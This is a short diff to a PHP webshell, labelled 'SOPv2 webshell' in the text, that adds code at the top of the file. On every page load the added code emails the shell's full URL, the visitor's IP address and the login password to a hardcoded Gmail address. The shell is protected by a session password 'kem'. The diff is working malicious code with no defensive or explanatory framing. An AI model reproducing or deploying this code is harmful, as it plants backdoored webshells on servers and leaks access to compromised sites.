@@ -1,4 +1,9 @@
 <?php
+$tujuanmail = 'muhrazky@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "cek $x_path  *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ] Pass: [ $pass ]";
+mail($tujuanmail, "SOPv2 webshell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?><?php
 session_start();
 $pass = "kem";
 if (!isset($_SESSION["auth"])) {
